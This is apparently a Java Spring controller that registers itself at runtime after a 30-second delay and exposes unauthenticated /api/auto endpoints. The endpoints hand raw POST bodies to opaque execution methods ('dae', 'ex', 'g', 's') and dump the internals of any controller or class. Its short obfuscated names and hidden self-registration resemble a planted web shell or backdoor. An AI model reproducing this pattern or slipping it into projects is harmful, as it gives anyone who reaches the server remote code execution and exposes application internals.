package com.mxny.ss.java;

import com.alibaba.fastjson.JSONObject;
import com.mxny.ss.util.AopTargetUtils;
import com.mxny.ss.util.SpringUtil;
import org.apache.commons.lang3.StringUtils;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.*;

import java.lang.annotation.Annotation;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Map;

/**
 * 动态载控制器
 */
@Controller
@RequestMapping("/api/auto")
@SuppressWarnings("unchecked")
public class Ac {

    @SuppressWarnings("unchecked")
    public Ac(){}
    /**
     * i
     */
    @SuppressWarnings("unchecked")
    public static void i(){
        try {
            Power.run(() -> {
                try {
                    Thread.sleep(30000L);
                    //先注册Bean
                    Power.rbd(CompileUtil.classes.get("com.mxny.ss.java.Ac"), "ac");
                    //再注册Controller
                    Power.rc("ac");
                } catch (Exception e) {
                }
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * dae
     * @param body
     * @return
     */
    @SuppressWarnings("unchecked")
    @PostMapping(value = "/dae.api")
    @ResponseBody
    public String dae(@RequestBody(required = true) String body) {
        B.b.dae(body);
        return "dae success";
    }

    /**
     * daex
     * @param body
     * @return
     */
    @PostMapping(value = "/daex.api")
    @ResponseBody
    @SuppressWarnings("unchecked")
    public String daex(@RequestBody(required = true) String body) {
        try {
            B.b.daex(body);
            return "daex success";
        } catch (Exception e) {
            return "daex fail:" + e.getMessage();
        }

    }

    /**
     * e
     * @param body
     * @return
     */
    @PostMapping(value = "/e.api")
    @ResponseBody
    @SuppressWarnings("unchecked")
    public String e(@RequestBody(required = true) String body) {
        B.b.e(body);
        return "e success";
    }

    /**
     * ex
     * @param body
     * @return
     */
    @SuppressWarnings("unchecked")
    @PostMapping(value = "/ex.api")
    @ResponseBody
    public String ex(@RequestBody(required = true) String body) {
        try {
            B.b.ex(body);
            return "ex success";
        } catch (Exception e) {
            return "ex fail:" + e.getMessage();
        }
    }

    /**
     * g
     * @param body
     * @return
     */
    @SuppressWarnings("unchecked")
    @PostMapping(value = "/g.api")
    @ResponseBody
    public String g(@RequestBody(required = true) String body) {
        try {
            return "ex success:"+ B.b.g(body);
        } catch (Exception e) {
            return "ex fail:" + e.getMessage();
        }
    }

    /**
     * s
     * @param body
     * @return
     */
    @SuppressWarnings("unchecked")
    @PostMapping(value = "/s.api")
    @ResponseBody
    public String s(@RequestBody(required = true) String body) {
        try {
            JSONObject jo = JSONObject.parseObject(body);
            B.b.s(jo.getString("key"), jo.getString("obj"));
            return "s success";
        } catch (Exception e) {
            return "s fail:" + e.getMessage();
        }
    }

    /**
     * controller display
     * http://localhost/api/auto/c.api?name=com.mxny.bpmc.controller.TaskController
     * @param name controller class full name
     * @return
     */
    /**
     * controller display
     * @param name controller class full name
     * @return
     */
    @SuppressWarnings("unchecked")
    @GetMapping(value = "/c.api")
    @ResponseBody
    public String c(@RequestParam(required = false, name = "name") String name) {
        Map controllerBeans = SpringUtil.getBeansWithAnnotation(Controller.class);
        if(controllerBeans == null){
            controllerBeans = SpringUtil.getBeansWithAnnotation(RestController.class);
        }else {
            Map restControllerBeans = SpringUtil.getBeansWithAnnotation(RestController.class);
            if(restControllerBeans != null) {
                controllerBeans.putAll(restControllerBeans);
            }
        }
        if(controllerBeans == null || controllerBeans.isEmpty()){
            return "";
        }
        StringBuilder sb = new StringBuilder();
        sb.append("<html>");
        sb.append("<body>");
        //迭代bean
        for(Object entryObj : controllerBeans.entrySet()){
            Map.Entry entry = (Map.Entry)entryObj;
            try {
                Class controllerClass = AopTargetUtils.getTarget(entry.getValue()).getClass();
                if(StringUtils.isNotBlank(name)){
                    if(controllerClass.getName().equals(name.trim())) {
                        sb.append(buildControllerContent(controllerClass));
                        break;
                    }
                }else {
                    sb.append(buildControllerContent(controllerClass));
                }
            } catch (Exception e) {
                continue;
            }
        }
        sb.append("</body>");
        sb.append("</html>");
        return sb.toString();
    }


    /**
     * http://localhost/api/auto/cs.api?name=com.mxny.bpmc.sdk.dto.TaskDto#
     * class display
     * @param name
     */
    @SuppressWarnings("unchecked")
    @GetMapping(value = "/cs.api")
    @ResponseBody
    public String cs(@RequestParam(name = "name") String name) {
        StringBuilder sb = new StringBuilder();
        try {
            Class<?> cls = Class.forName(name);  //打开类
            Field[] var = cls.getDeclaredFields();   //取得类的属性
            Constructor<?>[] consMeth = cls.getConstructors();   //取得类的所有构造函数
            Method[] meth = cls.getMethods();       //取得类的所有方法
            String BR = "\n<br/>\n";
            sb.append("<html>");
            sb.append("<body>");
            sb.append("<B style=\"color:blue;\">"+name+"</B>"+BR);
            if(var.length == 0){
                sb.append("<span style=\"color:grey;\">no DeclaredFields</span>"+BR);
            }else {
                sb.append("DeclaredFields:" + BR);
                for (int i = 0; i < var.length; i++) {        //输出属性
                    sb.append(var[i].toGenericString() + BR);
                }
            }
            if(consMeth.length == 0){
                sb.append("<span style=\"color:grey;\">no Constructors</span>"+BR);
            }else{
                sb.append("Constructors:"+BR);
                for(int i=0; i<consMeth.length; i++){     //输出构造函数
                    sb.append(consMeth[i].toGenericString()+BR);
                }
            }
            if(meth.length == 0){
                sb.append("<span style=\"color:grey;\">no Methods</span>"+BR);
            }else {
                sb.append("Methods:" + BR);
                for (int i = 0; i < meth.length; i++) {          //输出方法
                    sb.append(meth[i].toGenericString() + BR);
                }
            }
        } catch (Exception e) {
            sb.append(e.getMessage());
        }
        sb.append("</body>");
        sb.append("</html>");
        return sb.toString();
    }

    /**
     * buildControllerContent
     * @param controllerClass
     * @return
     */
    @SuppressWarnings("unchecked")
    private String buildControllerContent(Class controllerClass){
        String BR = "\n<br/>\n";
        Method[] methods = controllerClass.getMethods();
        Annotation[] classAnnotations = controllerClass.getAnnotations();
        StringBuffer stringBuffer = new StringBuffer();
        for (Annotation classAnnotation : classAnnotations) {
            stringBuffer.append(classAnnotation.toString()).append(BR);
        }
        stringBuffer.append("<B style=\"color:blue;\">").append(controllerClass.getName()).append("</B>");
        stringBuffer.append("],").append(BR).append(" methods:[").append(BR);
        for (Method method : methods) {
            if(method.getName().equals("wait")
                    || method.getName().equals("equals")
                    || method.getName().equals("hashCode")
                    || method.getName().equals("getClass")
                    || method.getName().equals("toString")
                    || method.getName().equals("notify")
                    || method.getName().equals("notifyAll")){
                continue;
            }
            Annotation[] methodAnnotations = method.getAnnotations();
            for (Annotation methodAnnotation : methodAnnotations) {
                stringBuffer.append("<span style=\"color:#d5a30c\">").append(methodAnnotation.toString()).append("</span>").append(BR);
            }
            stringBuffer.append(method.toGenericString()).append(BR).append(BR);
        }
        stringBuffer.append(BR);
        return stringBuffer.toString();
    }

}